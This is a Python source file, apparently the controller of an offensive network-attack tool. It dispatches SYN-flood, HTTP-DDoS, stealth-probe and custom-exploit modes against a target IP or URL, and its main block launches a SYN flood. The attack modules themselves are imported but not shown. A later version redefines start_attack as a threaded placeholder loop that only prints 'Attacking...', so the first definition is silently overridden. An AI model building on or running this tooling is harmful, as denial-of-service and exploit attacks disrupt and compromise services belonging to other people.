import json
import yaml
import os
from utils.ip_utils import is_valid_ip, is_private_ip
from utils.logger import setup_logger
from utils.decision_engine import decide_attack_mode
from core.packet_flood import syn_flood
from core.http_ddos import http_ddos
from core.stealth_probe import stealth_probe
from core.exploit_module import custom_exploit
#new v 0.0.3
import threading
import time
#closed


logger = setup_logger()

def load_config():
    with open('config/attack_config.yaml', 'r') as file:
        config = yaml.safe_load(file)
    return config

def start_attack(target_ip=None, target_url=None, mode=None):
    config = load_config()
    if mode == "SYN Flood":
        if target_ip and is_valid_ip(target_ip):
            syn_flood(target_ip, 80)
        else:
            logger.error("Invalid IP address for SYN Flood.")
    elif mode == "HTTP DDoS":
        if target_url:
            http_ddos(target_url)
        else:
            logger.error("Invalid URL for HTTP DDoS.")
    elif mode == "Stealth Probe":
        if target_ip:
            stealth_probe(target_ip, config['attack_settings']['default_ports'])
        else:
            logger.error("Invalid IP address for Stealth Probe.")
    elif mode == "Custom Exploit":
        if target_ip:
            payload = "Example Payload"
            custom_exploit(target_ip, 80, payload)
        else:
            logger.error("Invalid IP address for Custom Exploit.")
    else:
        logger.error("Unknown attack mode.")

if __name__ == "__main__":
    start_attack(target_ip="192.168.1.100", mode="SYN Flood")



#new v.0.0.3
# Variable to keep track of the attack state
attack_thread = None
attack_running = False

def start_attack(target_ip, target_url, mode):
    global attack_thread, attack_running
    if attack_running:
        raise Exception("Attack already in progress.")
    
    # Function to run the attack in a separate thread
    def attack():
        global attack_running
        attack_running = True
        try:
            # Simulate an attack process
            while attack_running:
                # Replace with actual attack logic
                print(f"Attacking {target_ip} using {mode}...")
                time.sleep(2)  # Simulate attack duration
        finally:
            attack_running = False

    # Start the attack thread
    attack_thread = threading.Thread(target=attack)
    attack_thread.start()

def stop_attack():
    global attack_running
    if not attack_running:
        raise Exception("No attack is currently running.")
    
    # Stop the attack
    attack_running = False
    
    # Wait for the attack thread to finish
    if attack_thread:
        attack_thread.join()
    print("Attack stopped.")

    ############ closed